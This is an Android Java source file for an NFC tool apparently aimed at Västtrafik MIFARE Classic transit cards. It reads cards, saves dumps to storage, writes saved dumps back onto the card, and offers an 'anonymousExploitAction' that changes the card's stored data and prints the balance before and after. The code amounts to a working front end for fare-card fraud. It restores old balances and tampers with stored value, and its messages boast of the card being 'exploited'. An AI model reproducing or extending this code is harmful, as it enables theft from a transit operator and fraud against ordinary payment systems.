package com.vsttrfk.git64;

import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import android.app.Activity;
import android.content.Intent;
import android.nfc.NfcAdapter;
import android.nfc.Tag;
import android.nfc.TagLostException;
import android.nfc.tech.MifareClassic;
import android.os.Bundle;
import android.os.Environment;
import android.text.method.ScrollingMovementMethod;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import android.widget.ScrollView;
import android.widget.TextView;

public class Vttrfkgit64Activity extends Activity {
	private MifareClassic mfcDevice;
	private TextView statusBox;
	private VsttrfkCard loadedCard;
	private EditText filePathEditText;
	private ScrollView scroll;
	/** Called when the activity is first created. */
	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);

		setContentView(R.layout.design2); // print some haxor ascii..
											// *important*
		statusBox = (TextView) findViewById(R.id.statusBox);
		statusBox.requestFocus();
		filePathEditText = (EditText) findViewById(R.id.filePath);
		scroll = (ScrollView) findViewById(R.id.scrollView);
		statusBox.setMovementMethod(new ScrollingMovementMethod());
		printDumps(getDumpList());

		update();
	}
	private void update(){
		scroll.fullScroll(View.FOCUS_DOWN);
	}
	private List<String> getDumpList(){
		List<String> dumps = new ArrayList<String>();
		String[] stuff = Environment.getExternalStorageDirectory().list();
		for(int i = 0; i < stuff.length; i++){
			if(stuff[i].endsWith(".mfd")){
				dumps.add(stuff[i]);
			}
		}
		return dumps;
	}
	private void printDumps(List<String> dumps){
		if(dumps.isEmpty()){
			statusBox.append("Läs in kort och skriv ut till fil\n");
		} else {
			statusBox.append("Sparade vsttrfkKort: \n");
			for(int i = 0 ; i < dumps.size(); i ++){
				statusBox.append(i+") "+dumps.get(i)+"\n");
			}
		}
	}
	private MifareClassic getCardFromReader(Intent intent) {
		MifareClassic result = null;

		if (NfcAdapter.ACTION_TECH_DISCOVERED.equals(intent.getAction())) {
			result = MifareClassic.get((Tag) intent
					.getParcelableExtra(NfcAdapter.EXTRA_TAG));
		} else {
			Log.e("ERROR",
					"Unknown: " + intent + "\nAction: " + intent.getAction());
		}
		return result;
	}

	public void readNfcAction(View view) {
		mfcDevice = getCardFromReader(getIntent());
		if (mfcDevice != null) {

			statusBox.append("Läser k0rt...\n");
			try {
				loadedCard = new VsttrfkCard(mfcDevice);
			} catch (IOException e) {
				statusBox.append("Fel vid läsning: \n" + e.getMessage());
				return;
			}
			statusBox.append(getCardInfo(loadedCard));

		} else {
			statusBox.append("yue put cardz on m3 first plx\n");
		}
		update();
	}
	

	public void writeFileAction(View view) {
		if (loadedCard == null) {
			statusBox.append("ing3t 1nl43s7 k0r7 -_-\n");
		} else {
			statusBox.append(Util.writeCardToFile(loadedCard) ? "d0n3!\n"
					: "Failed to write f1l3\n");
		}
		
		update();
	}

	public void writeNfc(VsttrfkCard card) throws IOException {
		final byte[][] data = card.getData();
		if(mfcDevice != null){
			if (!mfcDevice.isConnected()) {
				mfcDevice.connect();
			}

			final IVsttrfkAuthable writeAuth = new WriteAuth(mfcDevice);
			// first 4 blocks are manufacturer's read-only
			for (int i = 4; i < data.length; i++) {
				// every 4th block is a new sector... try to auth..
				if (i % 4 == 0 && !writeAuth.authToSector(i / 4)) {
					statusBox.append("Unable to auth to sect0r: " + i + ".\n");
				}
				if (i % 4 != 3) { // blcok 3 (fjärde blocket) håller i keys, vill ej skriva hit
					try {
						mfcDevice.writeBlock(i, data[i]);
					} catch (IOException e) {
						statusBox.append("Failed to write to block: " + i + " !! ");
					}
				}
			}
		} else {
			statusBox.append("Inget kort att skriva på");
		}
	}

	public void writeNfcAction(View view) {
		mfcDevice = getCardFromReader(getIntent());
		if (mfcDevice != null &&
				loadedCard != null &&
				Util.arrayEqual(mfcDevice.getTag().getId(), loadedCard.getId())){

			statusBox.append("Skr1v3r...\n"); 
			try {
				writeNfc(loadedCard);
			} catch (IOException e) {
				statusBox.append("Error connecting\n");
			}
			statusBox.append("d0n3\n");
		} else {
			statusBox.append("Either no card on reader, nothing to write, or id missmatch... :P\n");
		}
		update();
	}

	private static boolean isInt(String text){
			for(int i = 0 ; i < text.length(); i++){
				if(!Character.isDigit(text.charAt(i))){
					return false;
				}
			}
		return true;
	}
	public void readFileAction(View view) {
		List<String> dumpList = getDumpList();
		final String inputText = ""+filePathEditText.getText();
		if (inputText.length() > 0) {
			String binDump = Environment.getExternalStorageDirectory()
					.getAbsolutePath() + "/";
			if (isInt(inputText)){
				binDump += dumpList.get(Integer.parseInt(inputText));
			} else {
				binDump += inputText;	
			}
			try {
				loadedCard = new VsttrfkCard(binDump);
	
			} catch (FileNotFoundException e1) {
				statusBox.append("FILE " + binDump + " NOT FOUND\n");
				return;
			} catch (IOException e2) {
				statusBox.append("ERROR HANDLING FILE " + binDump + "\n");
				return;
			}
			
			statusBox.append(getCardInfo(loadedCard)
					+ "\nNu kan du skriva till nfc!\n");
	
		} else {
			statusBox.append("Ange filnamn.\n");
		}
		update();
	}

	private static String getCardInfo(VsttrfkCard card){
		byte[] id = card.getId();
		String strId = "";
		for(int i = 0 ; i < id.length; i++){
			strId += Util.toHexString(id[i]);
		}
		return "\n1n14357 k0r7\n----------\nID: \t"+strId+"\nBalance: \t"+card.getBalance()+"\n"	;
		
	}
	public void anonymousExploitAction(View view) throws TagLostException,
			IOException {

		mfcDevice = getCardFromReader(getIntent());
		if (mfcDevice != null) {
			if (!mfcDevice.isConnected()) {
				mfcDevice.connect();
			}
			try {
				loadedCard = new VsttrfkCard(mfcDevice);

			} catch (IOException e) {
				statusBox.append("Fel vid läsning: \n" + e.getMessage());
				return;
			}
			double saldo = loadedCard.getBalance();
			if (!loadedCard.anonymousExploit()) {
				statusBox.append("Kortet är redan 3XPL0173|>\n" + "Saldo: "
						+ saldo + "\n");
				return;
			}

			writeNfc(loadedCard);

			statusBox.append("Saldo innan: " + saldo + "\n");

			saldo = loadedCard.getBalance();

			statusBox.append("Saldo efter: " + saldo + "\n");

		} else {
			statusBox.append("yue put cardz on m3 first plx\n");
		}
		update();
	}
}